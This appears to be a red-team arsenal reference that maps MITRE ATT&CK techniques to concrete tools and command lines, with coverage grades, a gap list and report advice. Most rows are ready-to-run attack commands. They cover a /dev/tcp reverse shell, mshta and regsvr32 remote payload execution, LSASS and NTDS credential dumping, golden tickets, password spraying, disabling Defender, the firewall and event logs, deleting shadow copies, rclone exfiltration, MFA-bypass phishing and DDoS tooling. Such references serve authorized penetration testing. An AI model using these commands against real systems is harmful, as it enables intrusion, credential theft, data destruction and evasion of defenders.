# ATT&CK coverage map: technique -> tool -> command

Purpose: turn MITRE ATT&CK from a poster into a routing table. Every row names the
specific tool, flag or module in this arsenal that performs the technique, and grades
how well the stack covers it.

Source of truth: `mitre-attack/attack-stix-data` enterprise bundle, pulled live and
parsed locally (15 tactics, 706 live techniques at pull time; TA0005 is now named
**Stealth** and TA0112 **Defense Impairment** is new). Re-pull and diff rather than
trusting a stale copy:

```bash
curl -sL -o attack.json https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json
python3 - <<'PY'
import json; d=json.load(open("attack.json"))
print(sum(1 for o in d["objects"] if o.get("type")=="attack-pattern"))
PY
```

Grades:
- **A** primary: the stack's default, scriptable, used every engagement.
- **B** supported: works, but situational or needs glue.
- **C** partial: only a slice is covered, or only via a third-party tool outside the arsenal.
- **gap** no coverage in this stack; named so you stop pretending.

Rule: an A-grade row still needs an operator who reads the OPSEC section of the tool's
reference file. Technique coverage is not detection coverage.

---

## TA0043 Reconnaissance

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1595.001 | Active Scanning: IP Blocks | `nmap -sS -Pn -p- --min-rate 5000`, `masscan -p1-65535 --rate 10000` | A |
| T1595.002 | Active Scanning: Vuln Scanning | `nuclei -l hosts.txt -severity critical,high -rl 150` | A |
| T1595.003 | Wordlist Scanning | `ffuf -w seclists/Discovery/Web-Content/raft-large-directories.txt -u https://t/FUZZ`, `feroxbuster -u https://t --depth 3` | A |
| T1592.001 | Hardware | Shodan `http.html:"router"`, `product:` fingerprints; `nmap -O --osscan-guess` | B |
| T1592.002 | Software | `whatweb -a 3`, `nuclei -t technologies/`, Wappalyzer | A |
| T1592.004 | Client Configurations | `nuclei -t ssl/`, TLS/JA3 probes via `camofox-browser` | B |
| T1589.001 | Credentials | `trufflehog github --org=t`, breach lookups | A |
| T1589.002 | Email Addresses | `subfinder -d t.com -all`, `amass intel -d t.com -whois`, theHarvester | A |
| T1589.003 | Employee Names | LinkedIn/Hunter OSINT, `spiderfoot -m sfp_linkedin` | B |
| T1590.001 | Domain Properties | `amass enum -d`, `whois`, CT logs via `curl crt.sh` | A |
| T1590.002 | DNS | `dig +trace`, `dnsx -a -resp`, `amass enum -passive` | A |
| T1590.005 | IP Addresses | `shodan search "ssl.cert.subject.CN:t.com"` | A |
| T1590.006 | Network Security Appliances | `nmap -sV --script http-waf-detect` | B |
| T1591.002 | Business Relationships | third-party/subsidiary mapping, `amass intel -org` | B |
| T1596.001 | DNS/Passive DNS | `shodan dns domain_info`, SecurityTrails | B |
| T1596.005 | Scan Databases | `shodan`, `ivre`, `nmap --script shodan` | A |
| T1598.003 | Spearphishing Link | `evilginx2`, `gophish`, `NGL-Phish` | A |
| T1588.005 | Exploits | `searchsploit`, `nuclei-templates`, GitHub PoC sweep | A |
| T1608.001 | Upload Malware | payload hosting on VPS, `python3 -m http.server` | B |

## TA0042 Resource Development

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1583.001 | Acquire Infrastructure: Domains | aged/categorised domain, Cloudflare front, `evilginx2` phishlet domain | B |
| T1583.003 | Virtual Private Server | any VPS + `ligolo-ng` proxy, `sliver` redirector | A |
| T1583.006 | Web Services | Cloudflare Workers/Pages relay, GitHub raw payload host | B |
| T1587.001 | Develop Capabilities: Malware | `donut`, `Rust-Hells-Gate`, `sliver generate --format shellcode` | B |
| T1587.002 | Code Signing Certificates | `osslsigncode`, stolen/expired cert abuse, `signtool` | C |
| T1588.002 | Tool acquisition | this repository; `blackarch`, `pimpmykali` | A |
| T1608.004 | Drive-by Target | cloned portal + `gophish` landing | B |

## TA0001 Initial Access

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1566.001 | Spearphishing Attachment | `donut -a 2 -f payload.exe` inside ISO/LNK, macro-less droppers | A |
| T1566.002 | Spearphishing Link | `evilginx2` (AitM cookie theft defeats MFA), `NGL-Phish` | A |
| T1566.003 | Spearphishing via Service | LinkedIn/Teams DM -> link | B |
| T1190 | Exploit Public-Facing Application | `nuclei -tags rce -severity critical`, `sqlmap`, hand PoC | A |
| T1133 | External Remote Services | VPN/Citrix/RDP gateway enum, credential spray via `nxc` | A |
| T1078.004 | Cloud Accounts | `pacu`, `cloudfox`, leaked token replay | B |
| T1078.002 | Domain Accounts | password spray `kerbrute passwordspray`, `nxc smb -u users -p Password1` | A |
| T1195.002 | Supply Chain: Software | dependency confusion, typosquat package | C |
| T1200 | Hardware Additions | O.MG cable, rogue AP, `Responder` on a drop box | B |

## TA0002 Execution

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1059.001 | PowerShell | `powershell -w hidden -enc <b64>`, PowerSploit `Invoke-*` | A |
| T1059.003 | Windows Command Shell | `cmd /c`, `wmic process call create` | A |
| T1059.004 | Unix Shell | `bash -i >& /dev/tcp/...`, `nc -e` | A |
| T1059.006 | Python | `python3 -c`, `scrapling` | B |
| T1204.002 | Malicious File | LNK -> `donut` loader, `.iso`/`.vhd` container | A |
| T1047 | WMI | `wmic /node:target process call create`, `nxc wmi -x` | A |
| T1053.005 | Scheduled Task | `schtasks /create /tn x /tr y /sc onlogon`, `nxc smb -x` | A |
| T1569.002 | Service Execution | `sc create`, `nxc smb -x "sc create ..."`, `impacket-psexec` | A |
| T1106 | Native API | direct syscalls in `Rust-Hells-Gate`, `SysWhispers` | B |
| T1620 | Reflective Code Loading | `donut`, `execute-assembly` in C2, `Invoke-ReflectivePEInjection` | A |
| T1218.011 | Rundll32 | `rundll32 comsvcs.dll, MiniDump <pid> out.dmp full` | A |
| T1218.005 | Mshta | `mshta https://host/a.hta` | A |
| T1218.010 | Regsvr32 | `regsvr32 /s /n /u /i:https://host/a.sct scrobj.dll` | A |
| T1129 | Shared Modules | `LoadLibrary`, sideload into signed EXE | B |

## TA0003 Persistence

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1547.001 | Registry Run Keys | `reg add HKCU\...\Run /v x /d payload` | A |
| T1547.014 | Active Setup | `reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{GUID}"` | B |
| T1543.003 | Windows Service | `sc create svc binPath= C:\p.exe start= auto` | A |
| T1053.005 | Scheduled Task | `schtasks /create /sc minute /mo 5 /ru SYSTEM` | A |
| T1546.003 | WMI Event Subscription | `nxc wmi` + permanent consumer script | B |
| T1136.001 | Local Account | `net user add`, `nxc smb --local-group` | A |
| T1136.002 | Domain Account | `impacket-addcomputer`, `bloodyAD add account` | A |
| T1098.001 | Additional Cloud Credentials | `pacu` backdoor-user, AWS access key create | A |
| T1098.004 | SSH Authorized Keys | append `~/.ssh/authorized_keys` | A |
| T1505.003 | Web Shell | `nuclei -tags webshell`, `weevely`, `p0wny-shell` | A |
| T1137.006 | Office Add-ins | WLL/VSTO sideload | C |
| T1197 | BITS Jobs | `bitsadmin /transfer j /download /priority high URL OUT` | B |
| T1546.015 | COM Hijacking | `reg add HKCU\Software\Classes\CLSID\{...}\InprocServer32` | B |
| T1037.001 | Logon Script (Windows) | `UserInitMprLogonScript` registry | B |
| T1542.003 | Bootkit | EFI, `bcdedit` tamper | C |

## TA0004 Privilege Escalation

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1548.002 | UAC Bypass | `fodhelper`, `ComputerDefaults`, `sdclt`, UACME | A |
| T1068 | Exploitation for PrivEsc | PrintNightmare, `nuclei -tags privesc`, Windows exploit suggester | B |
| T1574.002 | DLL Side-Loading | signed EXE + malicious DLL, `SharpCollection` gadget list | A |
| T1574.001 | DLL Search Order Hijacking | writable PATH dir planting | A |
| T1134.001 | Token Impersonation | `mimikatz token::elevate`, `incognito`, SeImpersonate + `GodPotato` | A |
| T1134.004 | Parent PID Spoofing | `--ppid` in loaders, C2 `spawn --ppid` | B |
| T1055.012 | Process Hollowing | C2 `execute` with `--method hollow` | B |
| T1611 | Escape to Host | container `--privileged` mount, `docker.sock` | C |
| T1610/T1609 | Kubernetes | `kubectl auth can-i --list`, privileged pod | C |
| T1078.002 | Valid Domain Accounts | session hunting via `nxc ldap --admin-count` | A |

## TA0005 Stealth

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1562.001 | Disable/Modify Tools | `Set-MpPreference -DisableRealtimeMonitoring`, AMSI patch | A |
| T1562.004 | Disable Firewall | `netsh advfirewall set allprofiles state off` | A |
| T1562.006 | Indicator Blocking | ETW `EtwEventWrite` patch | B |
| T1070.001 | Clear Windows Event Logs | `wevtutil cl System`, `cl` in C2 | A |
| T1070.004 | File Deletion | `del /f /q`, `rm -rf`, `sdelete -p 3` | A |
| T1070.006 | Timestomping | `SetMace`, `touch -r` | B |
| T1027 | Obfuscated Files | base64/`-enc`, `ConfuserEx`, string encryption | A |
| T1027.007 | Dynamic API Resolution | API hashing in `Rust-Hells-Gate` style loaders | B |
| T1140 | Deobfuscate/Decode | `certutil -decode`, `expand`, in-memory | A |
| T1497.001 | Sandbox Evasion | sleep/screensaver/domain-joined checks in loaders | B |
| T1564.004 | NTFS Alternate Data Streams | `type payload > file.txt:hidden` | B |
| T1564.006 | Run Virtual Instance | hidden Hyper-V VM for tooling | C |
| T1222.001 | Windows Permissions | `icacls`, `takeown` | A |
| T1553.002 | Code Signing | `osslsigncode`, stolen certs | C |
| T1205 | Traffic Signaling | port-knock door, `knockd` | C |

## TA0006 Credential Access

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1003.001 | LSASS Memory | `mimikatz sekurlsa::logonpasswords`, `nanodump --write --pid`, `comsvcs.dll MiniDump` | A |
| T1003.002 | SAM Database | `reg save HKLM\SAM`, `secretsdump -sam` | A |
| T1003.003 | NTDS | `ntdsutil`, `secretsdump -just-dc-ntlm` | A |
| T1003.004 | LSA Secrets | `secretsdump -security`, `reg save SECURITY` | A |
| T1003.006 | DCSync | `secretsdump -just-dc`, `mimikatz lsadump::dcsync` | A |
| T1110.001 | Password Guessing | `nxc smb -u users -p pass --continue-on-success` | A |
| T1110.002 | Password Cracking | `hashcat -m 1000 hashes.txt rockyou.txt`, `john --format=NT` | A |
| T1110.003 | Password Spraying | `kerbrute passwordspray -d dom users.txt 'Summer2026!'` | A |
| T1110.004 | Credential Stuffing | `CredMaster` with proxy rotation | A |
| T1558.001 | Golden Ticket | `mimikatz kerberos::golden /krbtgt:<hash>`, `ticketer.py` | A |
| T1558.002 | Silver Ticket | `ticketer.py -nthash <svc hash> -spn` | A |
| T1558.003 | Kerberoasting | `impacket-GetUserSPNs -request`, `rubeus kerberoast` | A |
| T1558.004 | AS-REP Roasting | `impacket-GetNPUsers -request`, `rubeus asreproast` | A |
| T1557 | AiTM | `Responder`, `bettercap arp.spoof`, `evilginx2` | A |
| T1056.001 | Keylogging | `mimikatz`/`nxc` keylog module, hardware O.MG logger | B |
| T1552.001 | Credentials in Files | `Snaffler`, `findstr /si password *.xml`, `LaZagne` | A |
| T1555.003 | Browser Credentials | `LaZagne browsers`, `nxc smb -M chrome` | A |
| T1552.004 | Private Keys | `Snaffler` file classes, `.ssh`, `.pfx` sweep | A |
| T1606.002 | SAML Token Forgery | ADFS golden SAML | C |

## TA0007 Discovery

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1087.002 | Domain Account Discovery | `nxc ldap --users`, `impacket-GetADUsers -all` | A |
| T1087.001 | Local Account Discovery | `net user`, `nxc smb --local-users` | A |
| T1018 | Remote System Discovery | `nxc smb CIDR`, `ping -a` sweep, `nbtscan` | A |
| T1046 | Network Service Discovery | `nmap -sV -p-`, `nxc` protocol sweep | A |
| T1135 | Network Share Discovery | `nxc smb --shares`, `net view`, `smbclient -L` | A |
| T1482 | Domain Trust Discovery | `nxc ldap --trusted-for-delegation`, `Get-ADTrust` | A |
| T1082 | System Information | `systeminfo`, `winPEAS` | A |
| T1083 | File/Directory Discovery | `dir /s`, `find`, `feroxbuster` on web | A |
| T1057 | Process Discovery | `tasklist /v`, `ps aux`, C2 `ps` | A |
| T1012 | Query Registry | `reg query HKLM\...` | A |
| T1049 | Connection Discovery | `netstat -ano`, `ss -tunap` | A |
| T1069.002 | Domain Group Discovery | `net group "Domain Admins" /domain`, BloodHound | A |
| T1518.001 | Security Software Discovery | `nxc smb -M enum_av`, `wmic /namespace:... AntiVirusProduct` | A |
| T1124 | System Time | `time /t`, `w32tm /tz` | B |

## TA0008 Lateral Movement

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1021.001 | RDP | `xfreerdp /v: /u: /p: /drive:`, `nxc rdp`, RDP relay `pyrdp` | A |
| T1021.002 | SMB/Admin Shares | `impacket-psexec`, `smbexec`, `wmiexec`, `nxc smb -x` | A |
| T1021.003 | DCOM | `impacket-dcomexec` | A |
| T1021.004 | SSH | key reuse, `ssh -L`, `nxc ssh` | A |
| T1021.006 | WinRM | `evil-winrm`, `nxc winrm -x` | A |
| T1550.002 | Pass-the-Hash | `nxc smb -H <nt>`, `impacket-psexec -hashes`, `evil-winrm -H` | A |
| T1550.003 | Pass-the-Ticket | `rubeus ptt /ticket:`, `KRB5CCNAME` export | A |
| T1550.004 | Web Session Cookie | cookie replay after `evilginx2` capture | A |
| T1570 | Lateral Tool Transfer | `smbclient put`, `impacket-smbclient`, `certutil -urlcache` | A |
| T1563.002 | RDP Session Hijack | `tscon <id> /dest:<session>` as SYSTEM | B |
| T1210 | Exploitation of Remote Services | relay (`ntlmrelayx`) + SMB signing check, `nxc smb --gen-relay-list` | A |
| T1072 | Software Deployment Tools | SCCM abuse, `SharpSCCM` | C |

## TA0009 Collection

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1005 | Data from Local System | targeted staging of docs/keys | A |
| T1039 | Data from Network Share | `Snaffler -s`, `smbclient recurse` | A |
| T1114.002 | Remote Email Collection | `evil-winrm` + `MailSniper`, Graph API | B |
| T1113 | Screen Capture | `nxc smb -M screenshot`, `import -window root` | B |
| T1056.002 | GUI Input Capture | fake credential prompt, `evilginx2` | B |
| T1074.001 | Local Data Staging | `7z a -p` into `C:\ProgramData\` | A |
| T1560.001 | Archive via Utility | `7z a -mx9 -p<pass> loot.7z \share\`, `tar czf` | A |
| T1005/T1025 | Cloud data | `pacu` S3/EC2 modules, `cloudfox` loot | B |

## TA0010 Exfiltration

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1041 | Exfil Over C2 | C2 `download`, `upload` from session | A |
| T1048.003 | Exfil Over Uncommon Protocol | DNS tunnel `dnscat2`, ICMP `ptunnel-ng` | B |
| T1567.002 | Exfil to Cloud Storage | `rclone copy` to S3/Mega, presigned PUT | A |
| T1029 | Scheduled Transfer | cron/schtasks + `rclone` | B |
| T1030 | Data Transfer Size Limits | `split -b 90M`, chunked upload | B |

## TA0011 Command and Control

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1071.001 | Web Protocols | `sliver --http`, malleable CS profile, BRC4 DoH | A |
| T1071.004 | DNS | `sliver --dns`, `dnscat2`, iodine | A |
| T1095 | Non-Application Layer | `sliver --wg` (WireGuard), TCP bind | A |
| T1572 | Protocol Tunneling | `ligolo-ng`, `chisel`, SSH `-L/-R/-D` | A |
| T1090.001 | Internal Proxy | `ligolo-ng` listeners, C2 `socks5` | A |
| T1090.003 | Multi-hop Proxy | redirector chain, CS `rportfwd` | B |
| T1105 | Ingress Tool Transfer | `certutil -urlcache`, `iwr`, `curl` | A |
| T1104 | Multi-Stage Channels | stager -> stage in `sliver`/`donut` | B |
| T1008 | Fallback Channels | profile failover | B |
| T1205.001 | Port Knocking | knockd / `fwknop` | C |
| T1573.001 | Encrypted Channel: Symmetric | AES in C2, `openssl enc` | A |
| T1568.002 | DGA | custom beacon domain set | C |

## TA0040 Impact

| ID | Technique | Implementation | Grade |
|---|---|---|---|
| T1486 | Data Encrypted for Impact | `openssl`/`gpg` file encryption, ransom note | B |
| T1490 | Inhibit System Recovery | `vssadmin delete shadows /all /quiet`, `wbadmin delete catalog` | A |
| T1489 | Service Stop | `sc stop`, `net stop` AV/EDR services | A |
| T1498.001 | Direct Network Flood | `MHDDoS` layer4 methods | A |
| T1499 | Endpoint DoS | `MHDDoS` layer7 methods, slowloris | B |
| T1485 | Data Destruction | `cipher /w`, `sdelete -z` | B |

## Defense Impairment (TA0112)

New tactic; treat as a peer of Stealth, not a footnote. The stack covers it through:
`nxc smb -M enum_av`, AV service stop, `DefenderControl`/`Set-MpPreference`, ETW patch,
EDR userland unhook (see `06-evasion-and-postex.md`), and driver blocklist checks before
BYOVD. Grade B overall: reliable on Defender, per-EDR engineering required elsewhere.

---

## Honest gaps

| Area | State | Cheapest fix |
|---|---|---|
| macOS tradecraft | thin | add `BishopFox/Invisibility` notes, JXA, `osascript`, TCC db |
| OT/ICS | none | `nmap --script modbus-discover`, `plcscan` |
| Containers/K8s | C | `kube-hunter`, `kubectl auth can-i --list`, `peirates` |
| Cloud identity depth (Entra) | B- | `roadtools`, `AzureHound`, token theft paths |
| EDR-specific bypass | B | per-vendor engineering; `awesome-edr-bypass` index |
| Wireless 802.11 | B (see `07-hardware-and-physical.md`) | adapter + `aircrack-ng` suite |
| Mainframe / VDI brokers | none | out of scope, say so early |

## Using this map in a report

1. Copy the techniques you actually executed, not the ones you intended.
2. Pair each row with the evidence ID that proves it (`EV-014` pcap, `EV-031` console log).
3. Mark planned-but-blocked techniques with the control that blocked them; that is the
   blue-team value.
4. Render as a heatmap only after the text table exists; the heatmap hides gaps.
